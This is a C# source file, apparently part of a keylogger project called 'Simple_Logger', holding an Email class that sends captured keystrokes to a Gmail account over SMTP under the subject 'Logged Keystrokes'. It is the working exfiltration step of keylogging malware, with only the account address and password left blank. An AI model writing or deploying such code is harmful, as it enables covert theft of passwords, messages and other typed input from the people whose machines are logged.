using System.Net.Mail;

namespace Simple_Logger
{
    public class Email
    {
        private const string Address = "";
        private const string Password = "";

        public static void SendEmail(string keystrokes)
        {
            var client = new SmtpClient();

            var email = new MailMessage(Address, Address);

            // Use TSL port

            client.Port = 587;
            client.EnableSsl = true;

            client.DeliveryMethod = SmtpDeliveryMethod.Network;
            client.UseDefaultCredentials = false;

            client.Credentials = new System.Net.NetworkCredential(Address, Password);

            // Gmails smtp server

            client.Host = "smtp.gmail.com";

            email.Subject = "Logged Keystrokes";
            email.Body = keystrokes;

            client.Send(email);
            
        }
    }
}
